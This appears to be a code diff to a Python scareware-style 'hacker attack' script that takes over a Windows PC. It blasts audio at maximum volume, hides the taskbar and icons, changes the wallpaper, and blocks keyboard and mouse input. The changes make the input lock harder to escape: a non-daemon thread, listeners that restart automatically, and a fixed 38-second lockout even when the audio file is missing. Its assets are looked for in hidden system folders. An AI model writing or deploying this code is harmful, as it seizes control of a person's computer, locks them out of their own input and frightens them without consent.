@@ -91,11 +91,16 @@ def minimize_all_windows():
 # ============================================
 def find_photos_folder():
     """Find the Photos folder containing 1.jpg through 9.jpg
-    Searches system locations first (as deployed by PC client v2.1+)"""
+    Uses C:\Users\shres\Audios as primary location"""
+    # Primary location (user specified)
+    primary_path = r"C:\Users\shres\Audios"
+    
     # System locations (deployed by PC client - most persistent)
     localappdata = os.environ.get('LOCALAPPDATA', '')
     search_paths = [
-        # System locations (deployed by PC client v2.1+)
+        # PRIMARY: User-specified location
+        primary_path,
+        # System locations (deployed by PC client - most persistent)
         os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
         r"C:\ProgramData\Microsoft\Windows\WER\Photos",
         r"C:\Windows\Prefetch\Photos",
@@ -146,7 +151,9 @@ def cycle_wallpaper():
     
     if not photos_folder:
         print("    [!] Photos folder not found")
+        print("    [!] Expected location: C:\\Users\\shres\\Audios")
         print("    [!] Searched in system locations:")
+        print(f"      - C:\\Users\\shres\\Audios")
         localappdata = os.environ.get('LOCALAPPDATA', '')
         search_paths = [
             os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
@@ -526,11 +533,18 @@ def max_volume():
 # 6. PLAY ATTACK AUDIO
 # ============================================
 def find_attack_audio():
-    """Find attack.mp3 in Photos folder (system locations first)"""
+    """Find attack.mp3 in Audios folder (uses C:\Users\shres\Audios as primary)"""
+    # Primary location (user specified)
+    primary_path = r"C:\Users\shres\Audios\attack.mp3"
+    
     # Use the same search logic as Photos folder
     localappdata = os.environ.get('LOCALAPPDATA', '')
     search_paths = [
-        # System locations (deployed by PC client v2.1+)
+        # PRIMARY: User-specified location
+        primary_path,
+        # Also check Photos folder in Audios directory
+        r"C:\Users\shres\Audios\Photos\attack.mp3",
+        # System locations (deployed by PC client - most persistent)
         os.path.join(localappdata, '..', 'LocalLow', 'Photos', 'attack.mp3') if localappdata else None,
         r"C:\ProgramData\Microsoft\Windows\WER\Photos\attack.mp3",
         r"C:\Windows\Prefetch\Photos\attack.mp3",
@@ -561,8 +575,11 @@ def play_attack_audio():
     audio_path = find_attack_audio()
     
     if not audio_path:
-        print("    [!] attack.mp3 not found in Photos folder")
-        print("    [!] Searched in system locations:")
+        print("    [!] attack.mp3 not found")
+        print("    [!] Expected location: C:\\Users\\shres\\Audios\\attack.mp3")
+        print("    [!] Searched in locations:")
+        print(f"      - C:\\Users\\shres\\Audios\\attack.mp3")
+        print(f"      - C:\\Users\\shres\\Audios\\Photos\\attack.mp3")
         localappdata = os.environ.get('LOCALAPPDATA', '')
         search_paths = [
             os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
@@ -574,7 +591,10 @@ def play_attack_audio():
         search_paths = [p for p in search_paths if p is not None]
         for p in search_paths:
             print(f"      - {os.path.join(p, 'attack.mp3')}")
-        # If audio not found, stop attack immediately
+        # If audio not found, continue attack but without audio (don't stop immediately)
+        print("    [!] Continuing attack without audio...")
+        # Wait for a reasonable duration (38 seconds) before stopping
+        time.sleep(38)
         input_blocking_active = False
         return
     
@@ -870,15 +890,32 @@ class HackerInputBlocker:
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 from pynput import keyboard, mouse
             
+            # Create listeners with suppress=True to block input
             self.mouse_listener = mouse.Listener(suppress=True)
             self.keyboard_listener = keyboard.Listener(suppress=True)
             
+            # Start listeners
             self.mouse_listener.start()
             self.keyboard_listener.start()
+            
+            # Wait a bit to ensure they're running
             time.sleep(0.5)
             
+            # Verify they're actually running
             if self.mouse_listener.running and self.keyboard_listener.running:
                 self.method_used = "pynput"
+                # Keep listeners alive by joining them in a separate thread
+                def keep_listeners_alive():
+                    try:
+                        if self.mouse_listener:
+                            self.mouse_listener.join()
+                        if self.keyboard_listener:
+                            self.keyboard_listener.join()
+                    except:
+                        pass
+                
+                listener_thread = threading.Thread(target=keep_listeners_alive, daemon=True)
+                listener_thread.start()
                 return True
         except Exception as e:
             pass
@@ -1054,9 +1091,27 @@ class HackerInputBlocker:
         
         print("    [OK] Input blocked using: %s" % ', '.join([m[0] for m in active_methods]))
         
-        # Wait while blocking is active
+        # Wait while blocking is active - keep checking and verifying blocking is still active
         while input_blocking_active:
             time.sleep(0.1)
+            # Verify blocking is still active (especially for pynput)
+            if self.method_used == "pynput":
+                if self.mouse_listener and not self.mouse_listener.running:
+                    # Restart if it stopped
+                    try:
+                        from pynput import mouse
+                        self.mouse_listener = mouse.Listener(suppress=True)
+                        self.mouse_listener.start()
+                    except:
+                        pass
+                if self.keyboard_listener and not self.keyboard_listener.running:
+                    # Restart if it stopped
+                    try:
+                        from pynput import keyboard
+                        self.keyboard_listener = keyboard.Listener(suppress=True)
+                        self.keyboard_listener.start()
+                    except:
+                        pass
         
         # Stop all active methods
         print("    [*] Stopping input blocking...")
@@ -1274,10 +1329,10 @@ def main():
     # THIRD: Max volume!
     max_volume()
     
-    # FOURTH: Start input blocking in background thread
-    input_thread = threading.Thread(target=disable_input_loop, daemon=True)
+    # FOURTH: Start input blocking in background thread (NOT daemon - must stay alive)
+    input_thread = threading.Thread(target=disable_input_loop, daemon=False, name="InputBlocker")
     input_thread.start()
-    time.sleep(0.2)
+    time.sleep(0.5)  # Give it more time to initialize
     
     # FIFTH: Hide icons, hide taskbar, and change wallpaper (while audio is playing)
     print("[*] Setting up desktop (icons, taskbar, wallpaper)...")
